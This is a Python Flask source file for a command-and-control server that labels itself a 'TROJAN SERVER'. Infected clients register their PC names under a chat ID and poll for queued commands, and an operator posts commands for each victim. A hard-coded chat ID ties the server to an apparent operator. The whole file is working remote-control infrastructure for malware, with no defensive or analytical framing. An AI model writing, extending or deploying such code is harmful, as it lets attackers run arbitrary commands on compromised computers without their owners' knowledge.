
from flask import Flask, request, jsonify
import os
import json

app = Flask(__name__)

YOUR_CHAT_ID = "8657607900"

pending_commands = {}
active_clients = {}

@app.route('/')
def home():
    return "✅ TROJAN SERVER WORKS!"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/register/<chat_id>', methods=['POST'])
def register(chat_id):
    data = request.get_json()
    pc_name = data.get('pc_name', 'Unknown')
    active_clients[chat_id] = pc_name
    return jsonify({"status": "ok"})

@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(active_clients)

@app.route('/poll/<chat_id>', methods=['GET'])
def poll(chat_id):
    if chat_id in pending_commands and pending_commands[chat_id]:
        cmd = pending_commands[chat_id]
        pending_commands[chat_id] = None
        return cmd
    return "NO_CMD"

@app.route('/cmd/<chat_id>', methods=['POST'])
def cmd(chat_id):
    command = request.data.decode('utf-8')
    pending_commands[chat_id] = command
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
